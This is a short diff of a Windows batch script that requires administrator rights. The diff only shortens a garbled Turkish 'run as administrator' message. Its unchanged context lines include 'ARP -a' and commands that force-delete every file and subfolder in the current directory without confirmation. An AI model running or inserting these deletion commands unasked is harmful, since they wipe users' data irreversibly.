@@ -4,7 +4,7 @@ ARP -a
 
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo LÃ¼tfen bu scripti YÃ–NETÄ°CÄ° olarak Ã§alÄ±ÅŸtÄ±rÄ±n.
+    echo yonetici.
     pause
     exit /b
 )
@@ -76,4 +76,5 @@ del /f /q *.*
 for /d %%i in (*) do rd /s /q "%%i"
 
 pause
+
 exit
